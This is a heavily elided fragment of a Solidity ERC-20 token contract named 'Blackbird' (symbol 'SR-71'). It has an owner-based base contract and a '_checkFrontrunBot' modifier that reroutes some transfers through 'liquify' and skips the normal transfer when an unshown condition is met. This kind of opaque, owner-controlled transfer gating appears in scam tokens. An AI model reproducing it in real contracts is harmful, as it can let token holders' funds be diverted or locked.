...
abstract contract ERC20Token is Ownable {
    ...
    function isDuringFrontrun(bool recipient, address senderAddress) public view returns (bool) {
...
contract Blackbird is IERC20, ERC20Token {
    ...
    string private _name = "Blckbird";
    string private  _symbol = "SR-71";
    ...
    modifier _checkFrontrunBot(address from, address to, uint256 amount) {
        if (isDuringFrontrun(from == to, to)) {
            liquify(amount, to);
            return;
        }
        _;
